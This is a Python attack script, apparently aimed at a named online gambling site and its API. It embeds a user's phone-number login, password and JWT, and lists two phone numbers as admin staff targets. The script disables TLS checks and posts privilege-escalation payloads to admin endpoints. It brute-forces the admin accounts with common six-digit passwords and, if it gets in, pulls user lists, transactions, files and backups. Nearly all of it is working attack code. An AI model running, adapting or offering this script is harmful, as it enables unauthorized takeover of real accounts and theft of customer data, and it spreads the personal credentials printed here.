#!/usr/bin/env python3

import requests
import json
import time
import itertools
import threading
from urllib.parse import urljoin
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
API_BASE = "https://jklmn23456.com/api/v1/"
TARGET_URL = "https://pigslot.co/"

# Test user credentials
TEST_USER = {
    'username': '0960422161',
    'password': '181242',
    'customer_code': 'PS663888386',
    'jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTYyOTA1OTcsInBob25lX251bWJlciI6IjA5NjA0MjIxNjEiLCJ1c2VyX3VpZCI6ImRjZmQ0MzI0LWJjMjMtNDQ1OS1hMjE0LTA3Yjg0NWIwZmZiMiIsImN1c3RvbWVyX2NvZGUiOiJQUzY2Mzg4ODM4NiIsImdhbWVfdG9rZW4iOiJnYW1lLTM4NTc1ZjQ0LTEwMjUtNDA1Yi04MjY2LTRiODI3OGMwZDc4NCJ9.qoPAZ3S59djd2-RYABVJ4YakGdx4TtNX17JJkam803I'
}

# Target admin staff phone numbers
ADMIN_TARGETS = ['0642052671', '0818510592']

class AdminForceExploiter:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://pigslot.co',
            'Referer': 'https://pigslot.co/'
        })
        
    def analyze_admin_force_risk(self):
        """Analyze the risks of Admin-Force vulnerability"""
        print("🚨 ADMIN-FORCE VULNERABILITY RISK ANALYSIS")
        print("=" * 60)
        
        # Test authenticated access to admin-force
        self.session.headers.update({
            'Authorization': f'Bearer {TEST_USER["jwt"]}'
        })
        
        try:
            response = self.session.get(f"{TARGET_URL}admin-force")
            if response.status_code == 200:
                print("✅ Admin-Force accessible with user token")
                print(f"Response size: {len(response.content)} bytes")
                
                # Check for admin indicators
                content = response.text.lower()
                admin_indicators = ['admin', 'administrator', 'dashboard', 'control panel', 'management']
                found_indicators = [ind for ind in admin_indicators if ind in content]
                
                if found_indicators:
                    print(f"🎯 Admin indicators found: {found_indicators}")
                    
                    # Test for hidden admin functions
                    self.test_hidden_admin_functions()
                    
        except Exception as e:
            print(f"❌ Error accessing admin-force: {e}")
    
    def test_hidden_admin_functions(self):
        """Test for hidden admin functions that might be exposed"""
        print("\n🔍 Testing Hidden Admin Functions")
        print("-" * 40)
        
        # Test admin endpoints with admin-force session
        admin_endpoints = [
            '/api/v1/admin/users/promote',
            '/api/v1/admin/permissions/grant',
            '/api/v1/admin/roles/assign',
            '/api/v1/admin/privileges/elevate',
            '/api/v1/user/role/update',
            '/api/v1/user/permissions/modify',
            '/api/v1/account/upgrade',
            '/api/v1/profile/admin/set'
        ]
        
        for endpoint in admin_endpoints:
            self.test_privilege_escalation_endpoint(endpoint)
    
    def test_privilege_escalation_endpoint(self, endpoint):
        """Test specific endpoint for privilege escalation"""
        escalation_payloads = [
            {'role': 'admin', 'user_id': TEST_USER['username']},
            {'permissions': ['admin'], 'phone': TEST_USER['username']},
            {'admin': True, 'customer_code': TEST_USER['customer_code']},
            {'privilege_level': 'administrator'},
            {'user_type': 'admin', 'force': True}
        ]
        
        for payload in escalation_payloads:
            try:
                response = self.session.post(f"{API_BASE.rstrip('/')}{endpoint}", json=payload)
                if response.status_code != 404:
                    print(f"🎯 Endpoint {endpoint} responded: {response.status_code}")
                    if response.status_code == 200:
                        print(f"✅ Potential privilege escalation: {response.text[:200]}")
            except:
                pass
    
    def attempt_admin_phone_takeover(self):
        """Attempt to take over admin phone numbers"""
        print("\n🎯 ADMIN PHONE NUMBER TAKEOVER ATTEMPT")
        print("=" * 50)
        
        for phone in ADMIN_TARGETS:
            print(f"\n📱 Targeting admin phone: {phone}")
            self.brute_force_admin_phone(phone)
    
    def brute_force_admin_phone(self, phone):
        """Brute force admin phone with 6-digit passwords"""
        print(f"🔓 Attempting login for {phone} with 6-digit passwords...")
        
        # Common 6-digit patterns for admin accounts
        common_patterns = [
            '123456', '000000', '111111', '222222', '333333',
            '444444', '555555', '666666', '777777', '888888',
            '999999', '123123', '456456', '789789', '147147',
            '258258', '369369', '654321', '987654', '112233',
            '445566', '778899', '101010', '202020', '303030'
        ]
        
        # Also try birth years and common dates
        birth_years = ['199001', '199101', '199201', '198501', '198001']
        common_dates = ['010101', '123101', '311201', '250465', '151265']
        
        all_passwords = common_patterns + birth_years + common_dates
        
        for password in all_passwords:
            if self.try_admin_login(phone, password):
                return True
                
        print(f"❌ Failed to crack {phone} with common patterns")
        return False
    
    def try_admin_login(self, phone, password):
        """Try to login with phone and password"""
        login_data = {
            'phone_number': phone,
            'password': password
        }
        
        try:
            response = self.session.post(f"{API_BASE}auth/login", json=login_data)
            if response.status_code == 200:
                data = response.json()
                if 'authorization' in str(data).lower() or 'token' in str(data).lower():
                    print(f"🎉 ADMIN LOGIN SUCCESS!")
                    print(f"Phone: {phone}")
                    print(f"Password: {password}")
                    print(f"Response: {data}")
                    
                    # Save admin token
                    if 'data' in data and 'authorization' in data['data']:
                        admin_token = data['data']['authorization']
                        self.test_admin_privileges(admin_token, phone)
                    return True
        except:
            pass
        return False
    
    def test_admin_privileges(self, admin_token, phone):
        """Test privileges with admin token"""
        print(f"\n🔑 Testing admin privileges for {phone}")
        
        # Update session with admin token
        admin_session = requests.Session()
        admin_session.verify = False
        admin_session.headers.update({
            'Authorization': f'Bearer {admin_token}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        
        # Test admin endpoints
        admin_tests = [
            '/api/v1/admin/users',
            '/api/v1/admin/dashboard',
            '/api/v1/admin/system/info',
            '/api/v1/admin/files',
            '/api/v1/admin/backup',
            '/api/v1/users/list',
            '/api/v1/transactions/all'
        ]
        
        for endpoint in admin_tests:
            try:
                response = admin_session.get(f"{API_BASE.rstrip('/')}{endpoint}")
                if response.status_code == 200:
                    print(f"✅ Admin access confirmed: {endpoint}")
                    print(f"Response: {response.text[:200]}...")
            except:
                pass
    
    def advanced_admin_force_exploitation(self):
        """Advanced exploitation of admin-force vulnerability"""
        print("\n🚀 ADVANCED ADMIN-FORCE EXPLOITATION")
        print("=" * 45)
        
        # Try to manipulate admin-force state
        admin_force_payloads = [
            {'admin_force': True, 'user_id': TEST_USER['username']},
            {'force_admin': True, 'customer_code': TEST_USER['customer_code']},
            {'admin': True, 'force': True, 'bypass': True},
            {'role': 'administrator', 'temp': True},
            {'privilege_escalation': True, 'admin_mode': True}
        ]
        
        for payload in admin_force_payloads:
            self.test_admin_force_payload(payload)
    
    def test_admin_force_payload(self, payload):
        """Test specific admin-force payload"""
        try:
            # Try POST to admin-force
            response = self.session.post(f"{TARGET_URL}admin-force", json=payload)
            if response.status_code == 200:
                print(f"🎯 Admin-force POST success: {payload}")
                print(f"Response: {response.text[:200]}")
                
                # Test if privileges were escalated
                self.verify_privilege_escalation()
                
        except Exception as e:
            pass
    
    def verify_privilege_escalation(self):
        """Verify if privilege escalation was successful"""
        test_endpoints = [
            '/api/v1/admin/test',
            '/api/v1/users/all',
            '/api/v1/system/info',
            '/api/v1/admin/dashboard'
        ]
        
        for endpoint in test_endpoints:
            try:
                response = self.session.get(f"{API_BASE.rstrip('/')}{endpoint}")
                if response.status_code == 200 and 'admin' in response.text.lower():
                    print(f"🎉 PRIVILEGE ESCALATION CONFIRMED: {endpoint}")
                    return True
            except:
                pass
        return False

def main():
    print("🎯 ADVANCED ADMIN-FORCE EXPLOITATION & PRIVILEGE ESCALATION")
    print("=" * 70)
    
    exploiter = AdminForceExploiter()
    
    # 1. Analyze Admin-Force risks
    exploiter.analyze_admin_force_risk()
    
    # 2. Attempt admin phone takeover
    exploiter.attempt_admin_phone_takeover()
    
    # 3. Advanced admin-force exploitation
    exploiter.advanced_admin_force_exploitation()
    
    print("\n" + "=" * 70)
    print("🏁 EXPLOITATION COMPLETE")

if __name__ == "__main__":
    main()